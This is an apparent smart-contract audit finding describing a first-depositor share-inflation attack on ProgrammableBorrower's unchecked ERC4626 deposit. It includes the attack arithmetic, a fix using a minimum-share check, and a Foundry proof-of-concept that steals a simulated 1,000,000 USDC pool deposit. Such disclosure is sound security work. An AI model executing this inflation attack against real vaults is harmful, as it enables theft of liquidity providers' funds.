### Title
Unprotected ERC4626 deposit lets a first depositor steal revolving-credit principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts an arbitrary ERC4626 vault after checking only that `vault.asset()` equals the pool underlying, then deposits all idle credit-line funds without checking the shares minted or enforcing a minimum acceptable conversion rate. If the selected vault is empty or has negligible supply, an unprivileged vault user can execute the standard first-depositor/share-price inflation attack before the first epoch and cause the borrower contract's deposit to mint zero or economically worthless shares.

### Finding Description
During initialization and `setVault`, the integration validates only the vault address and its `asset()` value; it does not require an existing minimum share supply, minimum managed assets, recognized vault implementation, or protected initial liquidity. [1](#0-0) [2](#0-1) 

When an epoch starts, `IdleCDOEpochVariant.startEpoch()` transfers the surplus pool balance to the configured borrower contract and invokes the programmable-borrower start hook. [3](#0-2)  `ProgrammableBorrower.onStartEpoch()` then deposits its complete underlying balance into the configured vault. [4](#0-3) 

The vulnerable operation is `_depositToVault()`: it calls `vault.deposit(_assetAmount, address(this))`, emits the returned share amount, and never verifies that the amount is nonzero or within an acceptable range of `_assetAmount`. [5](#0-4)  ERC4626 explicitly warns that a deposit may receive unfavorable conversion relative to previews, so relying on the interface alone does not provide a fair-price guarantee. [6](#0-5) 

For a conventional ERC4626 implementation, an attacker can first deposit `1 wei` to obtain the only share and then donate `D` underlying directly to the vault. A subsequent pool deposit of `P <= D` rounds down to `P / (D + 1) = 0` shares, while the attacker remains the sole shareholder and can redeem the donated assets plus the pool deposit.

### Impact Explanation
An attacker can steal up to the full amount routed through the first vulnerable vault deposit, less dust and vault fees. For example, if the pool sends `P = 1,000,000 USDC` to the programmable borrower and the attacker previously donated `P` after buying one initial share, the borrower can receive zero shares for its deposit while the attacker redeems the vault balance and nets approximately `1,000,000 USDC`.

The loss is not isolated as a donation: `ProgrammableBorrower` treats the vault position as pool backing through `_currentVaultAssets()`. [7](#0-6)  When pending withdrawals or a close-pool recall require cash, the missing assets make `onStopEpoch()` unable to recover the required balance, after which `IdleCDOEpochVariant` enters the borrower-default path. [8](#0-7) [9](#0-8)  The resulting loss is therefore borne by tranche holders and pending withdrawal receipts through insolvency/default accounting rather than by the attacker.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or sufficiently illiquid for share-price inflation. `deployRevolvingCreditVault()` accepts the vault address as a deployment parameter, so use of a newly deployed vault or a public vault with negligible supply creates the required window. [10](#0-9) [11](#0-10) 

No privileged role has to act maliciously. The attacker only needs to be an ordinary depositor in the configured public ERC4626 vault and execute the first deposit/donation before the pool's first `startEpoch()` deposit. Vaults that already have substantial protected supply, virtual-share defenses, permissioned deposits, or deposit minimums reduce or eliminate this specific path, but the contract itself does not enforce those properties.

### Recommendation
Do not rely solely on `asset()` compatibility when configuring the vault. Require an operationally protected vault and enforce conversion bounds on every deposit:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || shares < expectedShares * MIN_DEPOSIT_BPS / BPS) {
    revert InvalidAmount();
}
```

The threshold should account for documented deposit fees and rounding. At configuration time, also require minimum vault `totalSupply()`/`totalAssets()` or only integrate vaults with audited inflation protection. For a new vault, the owner should seed protected initial liquidity before enabling the programmable borrower, although an explicit minimum-share check is still preferable because it protects later deposits from manipulation.

### Proof of Concept
A Foundry PoC can reproduce the theft with a mock ERC20 and a minimal ERC4626 implementation:

```solidity
function testProgrammableBorrowerVaultInflationTheft() public {
    // Attacker and LP are unprivileged.
    address attacker = makeAddr("attacker");
    address lp = makeAddr("lp");

    uint256 poolDeposit = 1_000_000e6;

    // 1. Configure ProgrammableBorrower with an empty ERC4626 vault whose
    //    asset is the credit-vault underlying. The existing asset check passes.
    MockERC4626 vault = new MockERC4626(underlying);
    programmableBorrower.initialize(
        address(vault),
        address(cdoEpoch),
        owner,
        manager,
        revolvingBorrower,
        borrowerApr
    );

    // 2. Attacker becomes the first shareholder and inflates assets/share.
    deal(address(underlying), attacker, 1 + poolDeposit);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    vault.deposit(1, attacker);                 // receives the only share
    underlying.transfer(address(vault), poolDeposit); // donation
    vm.stopPrank();

    // 3. An LP deposits into the credit vault and the honest manager starts
    //    the epoch. IdleCDO sends the assets to ProgrammableBorrower, whose
    //    onStartEpoch hook deposits them into the inflated vault.
    deal(address(underlying), lp, poolDeposit);
    depositAAAs(lp, poolDeposit);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // The exact-share vault mints zero shares for poolDeposit:
    // shares = poolDeposit * 1 / (poolDeposit + 1) == 0.
    assertEq(vault.balanceOf(address(programmableBorrower)), 0);

    // 4. The attacker redeems the only share for the donation plus pool funds.
    vm.prank(attacker);
    uint256 stolen = vault.redeem(
        vault.balanceOf(attacker),
        attacker,
        attacker
    );

    // Attacker funded 1 + poolDeposit and receives approximately
    // 1 + poolDeposit + poolDeposit, for a net theft of poolDeposit.
    assertGt(stolen, 1 + poolDeposit);
}
```

On a fork, the mock can be replaced by the configured real ERC4626 vault if it exposes an empty or near-empty initial state. The asserted end state is that the attacker owns the vault's redeemable shares while `ProgrammableBorrower` owns zero or dust shares, making the subsequent withdrawal or close-pool recall undercollateralized and forcing the CDO into default accounting.
